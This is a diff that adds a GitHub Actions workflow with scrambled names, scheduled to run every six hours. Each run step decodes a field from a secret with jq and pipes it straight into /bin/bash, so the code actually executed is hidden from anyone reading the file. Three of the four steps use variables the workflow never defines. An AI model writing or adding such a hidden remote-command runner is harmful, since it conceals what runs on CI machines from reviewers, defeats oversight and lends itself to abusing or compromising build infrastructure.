@@ -1,0 +1,21 @@
+name: pigmanjerky
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '21 4/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: pigmanjerky
+        env:
+          kuo886: ${{ secrets.kuo886 }}
+        run: |
+          echo $kuo886 | jq -r .oa55 | /bin/bash
+          echo $l54 | jq -r .o7061 | /bin/bash
+          echo $t14556 | jq -r .akwlf124 | /bin/bash
+          echo $j09 | jq -r .yfb609 | /bin/bash
+
